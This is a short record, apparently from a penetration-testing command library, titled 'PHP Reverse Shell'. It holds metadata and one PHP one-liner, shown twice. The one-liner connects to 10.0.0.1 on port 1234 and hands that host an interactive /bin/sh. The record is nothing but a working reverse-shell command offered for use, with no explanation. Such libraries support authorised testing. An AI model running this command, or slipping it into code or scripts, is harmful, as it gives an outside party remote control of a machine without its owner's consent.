---
id: 434b1aa1-13d6-4444-bfe9-6ef861b14cc8
name: PHP Reverse Shell
type: command
executor: null
data: php -r '$sock=fsockopen("10.0.0.1",1234);exec("/bin/sh -i <&3 >&3 2>&3");'
output: null
created_at: '2019-09-17T20:45:43.011454+00:00'
updated_at: '2023-05-29T16:48:52.884824+00:00'
---

# PHP Reverse Shell

```bash
php -r '$sock=fsockopen("10.0.0.1",1234);exec("/bin/sh -i <&3 >&3 2>&3");'
```


